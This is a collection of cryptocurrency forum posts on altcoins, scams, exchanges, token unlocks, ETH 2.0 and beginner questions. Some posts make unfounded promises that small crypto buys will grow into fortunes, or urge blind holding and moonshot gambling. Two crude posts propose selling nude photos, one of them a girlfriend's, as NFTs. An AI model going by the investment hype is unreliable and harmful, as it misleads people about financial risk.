I purchased some coin in this exchange it was called AFKS this coin is going really much in profit so i invested in it and now after couple weeks it made me a big profit so I converted them into usdt. And now when i tried to transfer them to my binance account so the exchange have holded my money and they are asking me to pay taxes on the profit that i have made makes sence. So after they calculated my taxes so i tried to pay them from the profit i made so they declined it and told me to send the taxes from another account not this profit. And it a huge amount around 5000usdt they are asking now. So my question is that does anyone her have any knowledge or experience with this exchange is it real not any scam should i trust them by transferring usdt they requires from another account ?? Or is this a scam ???

Hi, 

&amp;#x200B;

I am new to the Crypto world but have been a stock investor for 2 years. I am used to trading volatile stocks but also have a long term portfolio. I started this journey in Crypto that I would build a well diversified portfolio of coins and tokens (30 positions) and just buy the dips, hold and sell gains to reinvest but not totally divest. I guess my question is is that a good strategy for crypto?? 

I know it is much more volitle and everyone says were getting to the end of this bull run but I'm not so sure. I feel like some of the projects have got LOTS of room to run.......

Would love to hear from some diamond hands on their approaches........

&amp;#x200B;

TIA

This may get downvoted but dont really care. 

Not sure why Digibyte hasnt had more price action and isnt worth a lot more. Capped supply of 21 billion, one the cheapest, fastest and most secure cryptos out there with 5 different mining chains. 40x fastest than bitcoin, 10x fastest than litecoin I believe. 

Staking partnership with BlockBank, massive partnership with lulu group, entry into the metaverse and making there own NFTs. 100% completely de-centralised (not that alot of people seem to care anymore) 

With all this in mind why dont people like digibyte? I personally still think it has a massive future. Whats everyones thoughts?

I am brand new to any and every form of self directed investing. I have a retirement account that I plan on rolling over a portion into a self directed IRA, and I am very interested in learning how to identify the best cryptocurrencies for investment. The only sites I have found are gimmicky, churning out tons of "urgent" emails that require hours of time watching presentations that always seem to lead to buying something (a system, a book, info from an algorithm, etc). Are there any legit avenues to learn from?

Met with Dr. Strange and started talking to him. I told him that I'm currently holding a couple of stablecoins. Him being an expert in things which are able to create stable life by utilizing infinity stones made him the perfect person to hire for my cryptocurrency venture. The bull market was nearing it's peak, my ADA and ALGO were up a whopping 1% and blood was rushing through me. So I end up asking him to look into the future for me...

Dr. Strange: "I looked forward in time, I saw 14,000,605 futures"

Now just for beginners who doesn't what DYOR is Do your own research , no one can a coin which your going to invest better than you so it's always better to do that before investing.


COINMARKETCAP - This is the first go to resource where you can find all the coins Ranking from 1-13K so you can find anything in there 

Messari - This is just like COINMARKETCAP but I use this to filter coin based on sector and you can see dominance of each coin in each with various other information like supply and native staking rewards

Etherscan/BSC Scan - If your coin is either of them , this website can be used to check the holdings of your coin , anything above 70% in a single wallet is always to be looked up before investing

ICO Drops - I use this to see how the early investors were interested in the project , if they've raised more money then it means many investors were interested in buying those coins much earlier

Coin Market Cal - this website can be used to see if there are any upcoming events for the coin you want to invest

Crypt panic / coin telegraph - These are some of best news app that I look on regular basis to get a broader understanding

Lunar Crush - This is an AI driven website which can be used to find Alts and how they're driven by social media engagement

Whitepaper - everyone should read this before investing 

Medium - Many crypto project posts there unique feature through the website

Crypto Quant - if you want to do some onchain analysis this is the best website out there - some features are paid though I haven't used them just free version suits me

These are most of the website I use when I look into a coin before investing and just buy doing this I'm sure you would be in top 5% who really does the dyor before investing in them. Please mention if I have missed anything would be nice to get some new tools for my next project

This is aimed at Only-Fans girls who don't do nudes because they'll lose alot of there following once they do.

Create a private nude gallery. 

Mint a single NFT and sell it. 

Owning the NFT gives the owner access to a private gallery of Nudes. 

Once you've had enough sell the NFT on the open market to someone else who wants to see them and get your money back. 

However someone could just screen cap the pics, sell the NFT then leak the pics, there's a solution to that. 

How would this work?.. 

The proceeds of each sale are distributed as follows. 

10% goes to OP - Only Fans model.
40% goes to Previous owner. 
50% is evenly distributed amongst all Previous owners. 

This would incentivise all previous owners to not leak the pics they have seen as once they do, the value of the NFT would go to zero and they wouldn't get any more royalties from future sales. 

Obviously eventually as the number of previous owners increases the royalties would diminish to the point where its not lucrative at all and pics would eventually leak. 

I thought this would be a interesting use case and as an experiment to see how long something like this could last. And just how lucrative it could be, as an early owner of this NFT you could actually make substantial Profit in royalties.

Here comes the story of how crypto changed my life. I'm almost 30 and actually barely saved any money until I was 25. Then things changed in my life and I realized that it doesn't make sense for me to live from day to day and spend everything on material things. I need to plan for the longer term was my thought.

At that point I had heard something about crypto, but I didn't look into it further. That's why I started just depositing regularly into my savings account at my bank. After about a year and displeasure with the low interest rates, I decided to switch to fund savings. It wasn't much better, as the bank's fees ate up a lot of my gains. Nevertheless, I stayed with this option until June 2021.

However, since I had been dealing with crypto more regularly since December 2020, I decided to finally buy some in the summer of 2021.

So I deposited a small amount on a trading platform. I was hooked immediately. How could I have ignored this for years? I switched to an exchange after a short time because the fees were much lower. And I started reading this subreddit. 

Fast forward to today:
I stopped daytrading (too much stress), started holding+DCA and even staking since a few days. I even took little peeks at whitepapers. It is still a long way to understand the technique behind it. But it is getting better day by day.

To sum it up:
I haven't made much profit yet (still much more than at the bank) but it's all green. So everything is good. I have learned from the mistakes I made in the first months. Also because of all of you. The information and exchange of opinions that goes on here is incredible! Thanks to each and every one whose posts have been a help to me!

I couldn't be more excited about what is going to happen the next few years! Bullish!

***The Squid Game scammers disappeared after taking $3 million from investors. Now, Binance wants to find them and bring them to justice.***

The masterminds behind the Squid rug pull are probably enjoying the good life after stealing more than $3 million in a matter of seconds. But Binance is doing everything it can to make sure their party is short-lived.

Binance, the largest cryptocurrency exchange platform in the world, is tracking the scammers. According to [Barrons](https://www.barrons.com/articles/squid-game-crypto-crash-binance-investigating-51635969488?tesla=y), an intelligence team is auditing the blockchain, gathering information to hand over to the authorities and help apprehend the scammers.

## Binance Wants Scamers to Pay

A Binance spokesperson assured that these strategies have become very popular in the crypto ecosystem recently and that they were working to trace the funds and provide the authorities with as many leads as possible to identify the perpetrators.

&gt;(Binance) is blacklisting addresses affiliated with the developers and deploying blockchain analytics to identify the bad actors.

\------------------------------

I don't think anything will happen here and the devs are on the safe side but it's nice to get some backup from Binance. 

&amp;#x200B;

As most of us know how the customer support at binance is I don't think there will be results. Anyway I am sorry for all who "invested" even it was clear from the start that something is fishy here.

So I've been thinking should I close my fidelity account down and go solely into BTC for my retirement.  I'm 32 years old with an active pension threw my union, I put 10% into my 4O1k every 2 week and 10% into my Roth (same intervals).  I have 2 children and a wife that rely on me to be financially sound and safe with investments.  I own ETH, XRP and DOT but my BTC percentage is low, would it be wise to start dropping roughly (rounding up) $500 biweekly into BTC only for long-term growth and Bank on BTC being my main source for retirement.

So I've been trying to explain to my brother why crypto isn't just a currency like  or $, but given that I'm pretty new in this topic myself, I'm not really sure of what some good examples would be.

So if you wouldn't mind, please share some reasons that are easy to understand for someone who doesn't know much about crypto, on why it is alot more than just a currency.

The only ones I know are ALGO, and that it partners with different companies to provide them a better networking structure(?) 

Anyways I'm thankful for any good explanation

Hi all, after having some lengthy discussions with friends, family and colleagues about Crypto, I recently wonder as to why more people arent turning to crypto with their savings instead of banks.

I have a relative who has recently had a fixed-term 3 year long ISA mature. From this, they made a whopping 6%.....yes you read that right. A ton of money locked away without being able to touch it for 3 whole years and if you do need to access it you have to pay a fee for the privaledge too.

In crypto however, we regularly see swings of between 1% &amp; 10% everyday. I know its a gamble and to those who are uneducated, they see crypto as this massive gamble that could never been used for good. they arent wrong, it is a gamble but are banks not capable of collapsing too?

So my query then of why arent more people investing in crypto still stands.

That is all.
-------------------------------

Not every answer can be easily found by Googling.

Some questions are about a deeper level of understanding.

For example, I'm not 100% sure how do blockchain updates work.
For example, if my ETH is in a cold wallet with no internet connection, how will it get the update? 

Or do only the nodes need to get the updates?

Now I understand this could be a stupid question coming from a lack knowledge, but I really want to understand the technology more.

 too afraid to ask about crypto?*"

Seriously, do you have any idea what percentage of people in the world actually have some of their networth in crypto?  Sub 6% from what I hear lately.   
Be proud just to be here, you are witnessing a financial revolution and get to be in it!

The majority of people do not invest any kind of money into their future, they live day by day and spend it as soon as they get it.   
As long as you are willing to live below your means for some time in order to invest for the future and actually do something to achieve that financial freedom - you are doing better in life than most of the people you know!

It doesn't matter if you invested $100 or $100k, if a hundred is a significant amount for you, than the gains on that would also be significant, so don't feel bad about not flexing yacht's from crypto.   
Remember, that time in the market is huge, so if you are patient those huge gains will eventually come.  
We are still very early in this crypto journey. 

Kudos for being here and being a part of this. It wouldn't be possible without people like you.

*  The Overselling story of Bitconnect: A lesson to be learnt 

October 28, 2017 Bitconnect annual ceremony, a man approaches the stage not knowing he is going to be immortalized. I believe, in this speech, Carlos Matos is actually doing what we do here on a daily basis: 

&amp;#x200B;

Hey hey heeeeeeey! Hey hey heeeeeey! Hey hey heeeeeeeeey! Whatsuh whatsuh whatsuh whatsuh whatsuh whatsuh whatsuup  Bitconnect! Hey hey heeeeey everybody my name is Carlos Matos and I am coming from New York City, New York and let me tell you guys that I am so excited, I am so happy, I am really so thrilled to be right now sharing this amazing, glorious, super, and exciting moment of my life with all of you guys, and let me tell you that we are really changing the world as we know it, the world is not anymore the way it used to be, mmm mmm, No! No! No! BITCONNECT! Wow! 

* 1) Over World changing

This part is how we sound when we speak about crypto to people who don't know about it. The talk about a paradigm changing tech which will transform the world as we know it. Yes Carlos Matos is an eccentric who was ultimately burnt by the bitconnect scam. Yet I would argue he could sway more people towards cryptocurrencies than all of us because he is making the same argument as so many do here. 

&amp;#x200B;

BITCONNECT! We are coming and we are coming in waves! We are starting and we are watching go all over the world! We are pelting the entire world! Let me tell you guys that I started 137 days ago with only $25,610 and right now I am reaching $140,000! Woah woah woah woah woah woah woah Whats up? And let me tell you that I am actually earning around one hundr I mean $1,400 on an every day basis, seven days a week! 

&amp;#x200B;

*  2) Over profits: What comes up doesn't fall (ever( trust me bro)) 

&amp;#x200B;

Carlos Matos his using his gains to explain that Bitconnect will never fall down ever. He is overselling his profits. I am doing the same with my predictions about Bitcoin and this is why I should add a grain of salt everytime. 

&amp;#x200B;

What I am right now independently, financially independently. I am saying to so many people who say that this was going to be con artist game, that this was gonna be a scammer game, Hey! Youre gonna lose all your money! My wife still doesnt believe in me! Im telling him Oh honey, this is real! Oh no no no no no, thats a scam! And I said But wait Im gonna go to the bank and Im gonna get my bitcoins and Im actually gonna turn it into dollars, here there right on the table! No, thats money you took from another account! And Ill say What am I gonna do Then I said to myself, You know what? When I am starting to put $10,000 a day on her, right on her, you know on her table. Then shes gonna say Woah! Hahaha! Yo yo yo yo yo! OK thats real! 

&amp;#x200B;

* 3) Over-not-addressing doubt: 

Carlos Matos once again provides us with an interesting lesson. Instead of addressing the fud from his wife with his research, he is saying: look, there are gains. This is a lesson for all of us to try to DYOR as much as possible. Learning slowly but steadily is key. If Carlos had done his research he would have said: "Yes you are right, this is a ponzi scheme and now that I have profited I'll pull out". 

&amp;#x200B;

&amp;#x200B;

Hahahaha! So guys, Im gonna tell you something. Faith and believe is the one thing that we will need to be able to change the world, and right now I believe that in this room, we have the seed thats gonna germinate and is going to explode into an amazing opportunity for us to change this entire world. I am so proud, I am so honored, I am so excited to be here right now and let me tell you something, that each and every one of you has the opportunity to become like those amazing people that we know here from Vietnam. Hey hey! My group from Vietnam! Making so much money that it could probably that could probably have a real hard time counting it! Ha ha ha ha ha ha! So guys, let me tell you, I love, BITCONNECT! 

&amp;#x200B;

* Conclusion: Over-invested: One project that will 'change the entire world' 

Carlos Matos experience with Bitconnect may be the experience we are seeing people having right now when they speak about their favorite coins. They are unable to put a grain of salt, unable to criticize what they love. 

If there is a lesson from the famous Carlos Matos speech it is that over-doing it is wrong. We should stay level headed as much as possible. 

Now if you can tell me what speech you would like to see featured, just tell me !

Im still having a hard time understanding what exactly is going on. SHIBA INU tram adverised 394 Trillion supply for months and they are now changing their minds?

Im just trying to figure out whats going because an increase of what 549 - 394 = 155 Trillion supply addition

Again just trying to find out whats really going on. The devs said they never added anything to supply which I believe but then why was the supply market as 394 Trillion for months then?

Things arent adding up and price is dropping so Im just trying to figure out what to do

Right, so lets start with a few things about me. I am not addicted to my phone or watching the crypto charts or even scrolling through Reddit, I just do those things so I can pass the time and I can put the phone down whenever I want to get some work done. I work as a bartender, I love mixing drinks reading about new cocktails, I love working in a fast pace environment as it makes time go much faster at work. Also seeing people enjoying my drinks brings me joy too so it is the path I choose. 

The day starts as any other day, I was up and eat my breakfast and drink my coffee but today I got distracted by my neighbor when I went outside to put the rubbish out, we started chatting and I did not notice the time fly. I then kinda rush back inside and start getting ready to leave for work. A very quiet day a head of me, covers today were quite low, we are off season so it is bout to happen. No matter. I had a few jobs that I wanted to do but we were to busy, planned in my head already, that should get me through lunch at least.  Was working a 10:00-22:00 shift so I needed to fill my day somehow. 

I get to work, clock in and start prepping for the lunch service. By 11:30 I had everything ready for the 12:00 lunch service to start. I just wanted to check my phone to see what the crypto markets are up to. It was a Monday so you never know how things will look after the weekend. I reach into my pocket and oh oh no! I left my phone home! Damn! Oh this is not going to be fun. But I am an adult at the end of the day. The sky wont fall if I dont use my phone for a day, right? Right?

12:00 is here, lunch starts and the first 2 hours go by quite fast as most of the covers were concentrated around that time so we have space to take in random walk-ins for the second sitting. But the walk-ins never showed up. The weather was not that great so I guess people werent wondering the streets. At 14:00 the time started to slow down. I was probably getting a check every 20 minutes it was extremely slow. Nothing to keep me distracted for a few minutes, no Reddit, no crypto charts, no google to help me look us any new cocktail recipes. I was bored. But I was prepared for situations like this! I has my to do list in my head! I had things to clean that take time so I started doing that. The problem is that with experience comes efficiency. I did my whole to do list in 2 hours. Damn me! But at least is 16:00 so break time. 30 mins to sit down eat something and chat with some coworkers. I ate my food in 10 mins. What now? I had 1 coworker with me on my break but he was on his phone the whole time not really willing to make conversation. Right, I guess I just need to sit here for the next 20 mins. Staring into nothing Oh boy the minutes drag when you are not distracted. Just try it now. Stare at the wall for 2 minutes, see if you can manage. I was wondering what is the crypto maker doing. Probably nothing, I am sure BTC is still bouncing around the 60k resistance  now turned support. We are fine! My technical analysis told me that the bull run was on. Unless BTC randomly flash crashes 20-30% we are still golden. It cant happen right? Right?

I went back to work and insert angelic choir oh,  its Steven! The only other person at work that follows crypto! I am saved! I approach him mimicking tweaker mannerisms as a joke (but not really), telling him that I dont have my phone on me so can he tell me whats up with the markets. He said that the day was boring and everything is crabbing. Oh thank god, crabbing is fine, I can live with crabbing. I calmed down and returned to work, I had to prepare for the 18:00 dinner service. 

I was was in the middle of doing some cocktails when someone approaches me and asks me if I can do an Eastern Standard. I never heard of it but I usually say yes because I can look up the recipe quite fast on my phone. Yeah, without realizing I dont have my phone on me, I kind of messed that one up. I had to find a colleague to lend me their phone to look up this cocktail. Luckily I find it and write down the ingredients. I could had not been this lucky because sometimes people have a random cocktail somewhere where its only specific to that bar and no one else knows the recipe. Well in the mean time I see an excited Steven running fast towards me, exclaiming, it crashed! I was like what?! Bitcoin crashed 60%! he said. My hearts stopped. Things start moving in slow motion, Steven is chatting some shit but I cant hear him. 1000 thoughts pop into my head all at the same time in the span of 5 seconds which feels like an eternity. How can this happen? Is he pulling my leg? I mean BTC did that a few weeks ago, it crashed from 52k to 31k. Is everything following BTC and its crashing now? Is this bull cycle over and I did not take profits? Is the crypto winter upon us? As he is about to show me the charts he exclaims  Nah, Im messing with you, still crabbing! Oh what a jerk I thought to myself, pissed but happy at the same time. 

The rest of the night was very uneventful, pushed through to 22:00 and finished my shift. What an exhaustive day that was. I say to myself. It really was, I was very tired. I will never take my phone for granted ever again! I will tie it around my neck if I have to. I am not addicted to it. But I did realize that I need a hit from time to time so I dont lose my sanity. It is the glue that binds the day together and the oil that makes it run smoothly. Our phones are a wonderful thing.

It was my first time gambling, and I will not be gambling for a very long time. I can honestly say its one of the greatest feelings to win while gambling on slots, but I dont feel the need to be greedy and wish to win more. I want to put 80% of my winnings towards two cryptos, for the sake of diversity (putting the 20% towards a gaming computer/setup). Im currently invested in NFTs on Eth blockchain and also have a bag in Ergo, so looking to buy two more coins. Thoughts? Suggestions? Mainly looking for low market cap coins with huge potential/upside. I consider this free money, considering the money I put to gamble with was minuscule. And Ive already been investing majority of my portfolio in crypto as well so a little more cant hurt.

As the title says, very new to crypto. I brought doge coin and shib earlier this year, mainly as a joke, however as shib doubled recently I cashed out and now have double what I put in, and it's made me realise how I could make more money with crypto but I'm lost. Are there beginners guides or any content at all regarding which coins to buy, when to know to sell, when to know to buy, and other terminology?

I'd really appreciate any help. Only in my 20s and I know this isn't a get quick rich scheme but a long-term investment which I want to make!

At least I got a good laugh out of some of the good memes. I just roll my eyes and scroll past all these "comedy" posts. They're borderline cringe at this point. And it's just people whorefarming moons which was apparently not okay to do with memes but is perfectly acceptable with low effort text "comedy" posts that are basically all the same when you strip them down to their essence.

Wow crypto is easy you just do this! Wow I became rich, the trick is to start super rich L0L.

Fucking pathetic. This sub needs to seriously get a grip. Between these dumb comedy posts, idiotic DD, a bunch of clueless idiots parroting bad advice in an echo chamber. 

There is literally not one reason to have your eyes on this sub anymore. Nothings funny. Nothings original. No information is of worth. Its all spam and moon farming and every second comment is one you've read ten thousand times.

This place makes me shudder.

This place used to be cool.

The WSB GME and moon-whoring really killed what was a good, rewarding place to hang around.

What has been left behind is cancer.

Alright I'll be honest, I want to ~~invest~~ gamble into some new altcoins that have the potential to 10x+ but I don't know how or where to discover these things. I only ever hear about new projects from this sub or tiktok but by the time I hear about them there, it's already too late IMO. Those projects are already mainstream and the reason they are being talked about it because they've already increased so much in value. 

Does anyone have any tips? How can I discover new altcoins that are more legit and have the potential to see ridiculous gains? Easy, I know. Thanks!

Friends, I need the advice of experienced cryptanalysts - well, or just those who understand this stuff :) Like many others, I decided to invest to "somewhere". I chose the GameFi segment for myself - at least there is something here besides speculation and you have a feeling that you can influence the result.

I got interested in Mbox (MBOX). Of course, the reason for the interest was its rapid growth a few weeks ago and the fact that by now the token continues to exist.

So, my question: has anyone in the community dealt with Mobox? Is it worth contacting and what are the pitfalls?

One of the biggest token unlocks in crypto history is in the process of happening, **today**, and so far no one has really noticed. The Axie Infinity project leaders, Sky Mavis, are in the process of cashing out an amount of tokens with their [token unlock schedule](https://whitepaper.axieinfinity.com/axs/allocations-and-unlock#:~:text=Allocations%20and%20Unlock%20schedule%20%2D%20Axie%20Infinity&amp;text=AXS%20will%20be%20unlocked%20in,22.22%25%20of%20the%20total%20supply.&amp;text=The%20expected%20issuance%20of%20AXS,lower%20than%20the%20unlock%20schedule.). So what are the unlock numbers?

* Advisors 2,700,000 tokens, \~$416M
* Sky Mavis 5,737,500 tokens, \~$884M

Totaling 10597500 tokens, \~$1.2B.

You can look at these numbers a bit closer in [this spreadsheet](https://docs.google.com/spreadsheets/d/1Tq_LeoSxtalWSKe_bobdQurlSpXdmVummIKtHUuOjUw/edit#gid=0).

The total doesnt include the Staking Reward of 6,851,250 tokens, \~$1B and the Ecosystem Fund of 1,687,500 tokens, \~$260M. Private Sale 2,160,000 tokens, \~$332M. We dont care about that additional \~$1.6B so much for the purpose of this post. The staking reward is gradual and goes to stakers. The Ecosystem Fund is great, it goes to helping people get more involved in crypto and is also gradual. The private sale tokens goes to people who helped make the project possible, theyll probably just cash and thats okay, they deserve it. So lets mostly consider the \~$1.2B of tokens being unlocked around the Axie team and I want to outline why that is important.

On the outside, this unlock is fine but when you take into account whats transpired so far today it gets a bit shady. Earlier today the Axie team (Sky Mavis) [announced their new DEX](https://twitter.com/AxieInfinity/status/1456161289722548225), this resulted in a price surge for AXS of around 10%. 

So now theres a new way for the Axie team to cash out, using this DEX for their unlocked tokens, which is in the process of happening today. This is partially viewable on the blockchain, due to the DEX being a bit centralized we cant view exactly whats happening but its relatively safe to assume that the Axie team are utilizing this DEX, that they just announced, to cash out. I'm not going to link the addresses but they have an ENS (e.g. XXX.axieinfinity.eth) so it's not so difficult to find.

Whats the point of this post? The Axie team did a bit of a 3-in-1 where they increased the price+liquidity by timing their *DEX* announcement on the exact date of the token unlock so that they could cash out and make it less visible on-chain. They are cashing out at this moment and on top of that $1.2B there is $1.6B being unlocked with a race to cash out.

So Ive just this week gotten into trying to learn about cryptocurrency and specifically LRC due to the FOMO around their alleged partnership with GameStop.

Im definitely not a crypto whale and have thrown some money into LRC. Now I guess the question I have is what are the tokens used for themselves on Loopring or any other network for that matter?

Im not really tech savvy and I dont know programming or anything like that, but if I wanted to what would I do with those tokens in my wallet? I know that I can hold them and sell them for current market value and exchange them for other crypto or USD. But what is the tokens use case, thats what I cant wrap my brain around or find a clear answer to.

Is it a deflationary crypto because the token is used to do something and cant be reused? Create an NFT or whatever?

Sorry if the question is a little below the normal knowledge base of the subreddit Im just kinda looking for an ELI5 answer.

So let's say we are going to get a card to access our money. Traditional banking gives you 2 options: debit cards and credit cards. 

Debit cards are very simple. They allow you to access the money in your account. No more than that. There's no catch. It's simply your money. There is little to no fees associated. You will never get in debt because you can only access your own money. You can overdraft and that will cost you. Crypto behaves this way. We have access to our funds minus transaction fees. You cannot overdraft. 

Credit cards are a little more interesting. They allow you to access money that you don't own. This is where banks make their money. The world runs on debt. So much that the USA debt is in the trillions. The american credit card debt is 930B according to an article titled "Credit card debt in the U.S. hits all-time high of $930 billionhere's how to tackle yours with a balance transfer" by Alexandria White. October 6, 2021. 

But credit has plenty of benefits. You can control double spending because credit card transactions are reversible. Plenty of times I am charged 3 times by Amazon but these transactions settle and go away. That also protects against identity theft. I can always report wrong transactions and get them verified. Credit cards are accepted almost everywhere and it's very easy to use. 


So why am I talking about traditional banking stuff in a crypto sub? Because we are talking about replacing traditional banking with peer to peer alternatives. Unfortunately today's crypto is stuck on debit cards type transactions.  Defi is trying to provide some of the loan benefits but not quite exactly. 

For crypto to fully replace currency I feel it will need credit card features. 

Verifiable and reversible transactions. 


Access to capital


Interest rates


How could this be done? In my opinion it could be very simple. PoS chains could serve as the bank. The money they stake would be the money the market can use as credit. This will definitely require KYC but that s ok. Crypto s mission was never to be anonymous. Satoshi wanted peer to peer electronic cash system. The only mention of anonymous in the whitepaper is for public keys. 


Now the stakers will serve as validators. When a transaction needs to be reversed they can be called to verify and confirm the transactions. The rewards for this job comes from the interest accrued. 


The whole credit system could be exported to the blockchain where instead a centralized credit bureau would analyze the risk of default based on credit history and incomes just like banks do. 


What I'm trying to propose is that to replace banking we need credit. This could be done by a semi centralized system to store KYC information. In order to maintain privacy the balances of wallets would be private to users. The nodes will be able to sort discrepancies in balance transfers and for that reason there is no need for individuals to see any wallet other than their own. The stakers become the bank. The rates simply go with the markets. 


Why do we need this? We need credit because we run societies on debt. We need reversible transactions not only to prevent errors, but also to prevent crime. KYC will guarantee government cannot criminalize crypto. We would not be "shadowy super coders" we would be regular people with names. The ability to see wallet balances needs to go away. That is not a feature that needs to exist. It doesn't with modern banking. I feel this would make adoption go from inevitable to inevitable within a short period of time because a lot of the concerns with crypto could be easily resolved.


I'm not a programmer or technician so I may have oversimplified many things. I am aware of that. Discuss.

Inflation is at its 30 year high in the US. It's way worse in some other places and it's not going to get better anytime soon. The worst thing is, inflation compounds. Ever looked at those compound interest charts from retirement savings accounts? it's the same thing with inflation but in reverse. You're losing money at a rapid pace.

Investing in a solid Crypto project can literally be a lifesaver for you. Not only do you get better interest rates on Crypto and better returns, you are also safe from inflation. The 6% USD inflation rate this year might look small today, but when this inflation is compounded year on year, you're losing  a huge chunk of your savings and your salary.

Just a few hundred dollars into Crypto today is most likely going to be hundreds of thousands of dollars in a decade. Do yourself a favor and invest in Crypto.

So I have a girlfriend with rather large and sizable breasts. They are not only large, but also naturally firm and dont droop too much. Perfect proportions for online art enthusiasts. 

Being a crypto man, I suggested that we take many nude photographs of her bodacious breasts and mint them. And then, after covering them in peppermint oil, turn them into NFTs. 

Now Ive heard that NFTs are selling for thousands and even millions of dollars worth of Ethereum. So my question is: will her big breast NFTs make me a millionaire, so that I dont have to waste time working at Wendys anymore?

When you are new to crypto, you will start to hear a lot of new terminology. If there is one thing you can take away is etch into your brain the word HOLD. 

When you hear everyone saying hold, you will say to yourself, ohh thats east I can do it. I have here for the long term blah blah blah. 

Soon you will get sucked into the rabbit hole and one coin research will lead to another. 

Then the constant watching the charts phase will come. 

Then then panic everytime there is a red candle. 

You will come here to validate your sentiment and it will be an echo chamber in the daily thread and a few will yell HOLD and you will ignore them and rather buy into they panic and lean towards the majority who are screaming sell. 

If you can have the disciple to read through the comments and not have an emotional reaction you will do fine. If not than, you will sell for a loss and only came back a few days/months later to see it recovered. And you will kick yourself for not having the disciple to HOLD. 

You will promise yourself, this time around you will be more disciplined and. I matter what you will HOLD. But you will end up reacting the same again. 


There was a study done by an investment firm where folks never checked or tinkered with their portfolio have the biggest portfolio compared to others. 

Just HOLD it.

**What is ETH 2.0:**

\- Ethereum wants to improve on three key aspects: Scalability, Security and Sustainability. It was initially planned as one big upgrade, though the devs have decided to deprecate that term and split Ethereum upgrades into multiple smaller upgrades. 

**What are the goals of ETH 2.0?**

**Scalability**:

\- The quick and dirty solution to scalability is to increase node size and ramp up parameters, like decreasing block time, increasing block size, just like how Solana achieves its high TPS. However, this comes at the downside of requiring high-end hardware, effectively creating a more centralized network, due to insane hardware demands. Ethereums approach is to implement sharding. Rather than increasing node size, the network will be split into 64 new chains. Each chain can operate at the current transaction speed, but each shard can process transactions independent from the other shards, leading to massively increased throughput. 

**Security**:

\- One of the main attack vectors against a network is the 51% attack. Given Ethereums size, its already difficult to obtain 51% of the hashing power, but switching over to POS will make it even harder, as it would require 51% of validating power in form of staked ETH. A validator risks part for their staked ETH to slashing, when acting maliciously. This will make repeat offending insanely difficult, as the offender must rebuy enough ETH for this attack to work.

**Sustainability**

\- POW requires massive energy. Staking is already live on the Beacon Chain and its estimated that the move to POS will reduce energy consumption by 99%

**What does this mean for layer 2?**

These are the issues, ETH 2.0 aims to address and scalability is only one part of it. In fact, let us end with a quote from the ETH devs:

`Given recent progress in layer 2 scaling solution research and development, this has prompted the prioritization of the merge upgrade ahead of shard chains.` 

Essentially, the devs are so impressed by the development of this subs favorite layer 2 solutions, like MATIC, Arbitrum &amp; Loopring, that they shifted their focus on the POS merge, instead.

It's almost an unwritten rule of this sub that every investor should DYOR before investing into a coin. But in practice, do you guys really research everything you invest into or do you simply pick something by word of mouth, youtubers, influencers (bruh...), charts, feeling of the market movements, etc.?

I'm really interested what that DYOR means for all of you. Surely

What is your "DYOR" before you invest?

1. I check the logo of the crypto
2. I check the price graph
3. I check the use cases and technology
4. I read their whitepaper
5. I trust opinions of other Redditors
6. I trust influencers
7. I trust Youtube analysts 
8. I just buy dips
9. I just feel it's gonna skyrocket
10. I check the github for their developement activity
11. I trust the popularity of it to carry it
12. I heard that it's a good investment by word of mouth
13. I simply invest randomly and hope for it to grow
14. Something completely different \[write the reason\]

Now that the moon goddess herself has graced our peasant souls with her presence and gifted us glorious moons, what did you do in order to gain them moons?

Did you copy and paste, post a meme, teach someone something educational? 

How low did you go in order to have more of them glorious moonies?

Did it cost you your dignity?

Mine was [a dumb FOMO comment](https://old.reddit.com/r/CryptoCurrency/comments/q1a80v/its_now_established_that_ethereum_is_going_to_be/hfdhpb9/) that I am sure has lost me the respect of my family.

How incredible to see that Harmony ONE being advertised on the billboards in Times Square. This means that the team really believes in it and their commitment is 110%. As a ONE holder myself I find this very cool to see and soothing! 

This is the first time I have also seen a crypto advertised in a well-known / big place in public. The advertisement was about 'Fund your NFT project: [harmony.one/nft](https://harmony.one/nft)', also nice advertisement for the NFT part! see below the picture of the advertisement in Times Square:

I looked up the definition for sharts in the urban dictionary and now I am puzzled.

Not only you guys on this sub seem to always include them in their posts but they also say that analizing sharts is important for investing.

Someone please clarify me, I'm losing all hope on humanity right now and I might rethink on becoming a monk.

Also, what do you really mean when you say some shart is going up or going down? It is making me feel dysmorphic, I have no idea how you manage to do that.



Edit: I might have misread it.

There are countless posts I see over here (some are thankfully getting removed) that people claim they know the next "mooncoin" as they call it, or the next opportunity to make you rich. No. Shitcoins/scamcoins/memes make rich a TINY portion of people, and they are the ones that brag/make the news. For every guy that gets rich off of a four legged coin, there are 1,000 that got f\*cked.

No, OP does not know about the next "mooncoin", you don't know about it, in fact no one does. These coins are practically gamble. Stick to the projects you researched for all these weeks/months/years and forget about "making a quick back". You will most likely fail and even if you don't and get lucky, you will keep trying and it won't always work.

We got an exciting bullrun ahead of us and projects that deserve attention, for the love of god let's talk about them instead, please

Hi, I am hoping to take payments for my app in BTC (and other cryptocurrencies) for transactions equivalent to around 2 - 3 USD. I signed up with NOWPayments, partly because of [this post](https://nowpayments.io/blog/new-minimal-payment-amounts) ("you can accept around $2 worth of these amazing cryptos:") but their [status page](https://nowpayments.io/status-page) lists minimum BTC payment right now as equivalent to just over 16 USD.

As far as I can tell, other payment gateways have similar restrictions. though it seems to be quite hard to get precise data on this.

Does anyone have any advice on how I can achieve what I am trying to do?

Want to laugh at someone? 

First reason: I bought VeChain VET at .21 several months ago, which transferred it to my exodus wallet to keep it off Binance.

I don't watch the market everyday but was thinking about trading a part of my VET, BUT I can't remember my Exodus password. No problem! Get the seed phrase you hand-wrote and have in a safe. 

I enter the seed phrase - and then OOF. only 11 words.   
Looks like I forgot to write down one of the 12 words and have now lost access to my Exodus wallet. Luckily, I only have VET on it and my other assets in other wallets. 

Welp, expensive mistake, let's hope it doesn't happen again.

Hi,

It's been two months since the crypto exchange was hacked. Since then most of us do not have access to the full funds on the account. Even if we can withdrawal them, the transaction fees exceed the value of the asets.  

All we get is vague answers on twitter and the same answers on telegram to be patient over and over again.

I know that bilaxy from the beginning did not look like a very trusted crypto exchange but it does not mean that it is the users fault that they lost money. 

I wonder if there is any proof that there was actually a hack event?Is there any investigation into this? Was there any class action lawsuit?Do we know where the market is registered? Do we know the owners? Do we know anything more about this? 

Or are we just taking part in the scam show?

I don't want to spread rumors or accuse bilaxy of being a scam. I just want real answers and proof. Just like almost 25k people on telegram who lost access to their funds during the bull run.

If anyone has any information please share, because from official sources we can't get anything. 

&amp;#x200B;

 Thank you

You might have heard of Golem, the 2016 ICO that raised $8m in 29 minutes to fund a decentralised marketplace for trading computing power.

